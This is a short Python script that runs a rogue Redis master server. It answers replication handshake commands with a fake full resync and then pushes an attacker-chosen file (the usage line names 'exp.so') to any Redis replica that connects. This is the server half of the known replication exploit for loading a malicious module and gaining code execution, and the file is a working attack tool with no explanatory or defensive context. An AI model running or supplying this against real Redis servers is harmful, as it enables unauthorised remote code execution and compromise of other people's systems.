#!/usr/bin/env python3
import os
import sys
import argparse
import socketserver
import logging
import socket
import time

DELIMITER = b"\r\n"

class RoguoHandler(socketserver.BaseRequestHandler):
    def decode(self, data):
        if data.startswith(b'*'):
            return data.strip().split(DELIMITER)[2::2]
        if data.startswith(b'$'):
            return data.split(DELIMITER, 2)[1]

        return data.strip().split()

    def handle(self):
        while True:
            data = self.request.recv(1024)
            logging.info("receive data: %r", data)
            arr = self.decode(data)
            if arr[0].startswith(b'PING'):
                self.request.sendall(b'+PONG' + DELIMITER)
            elif arr[0].startswith(b'REPLCONF'):
                self.request.sendall(b'+OK' + DELIMITER)
            elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'):
                self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER)
                self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                break

        self.finish()

    def finish(self):
        self.request.close()


class RoguoServer(socketserver.TCPServer):
    allow_reuse_address = True

    def __init__(self, server_address, payload):
        super(RoguoServer, self).__init__(server_address, RoguoHandler, True)
        self.payload = payload


if __name__ == "__main__":
    if len(sys.argv)< 2:
        print("python [port] [filename]")
        print("python 21000 exp.so")
        exit(0)

    lport = int(sys.argv[1])
    expfile = sys.argv[2]
    with open(expfile, 'rb') as f:
        server = RoguoServer(('0.0.0.0', lport), f.read())
    print("rogue server startup %d port"%lport)
    server.handle_request()
    print("recevice client request")
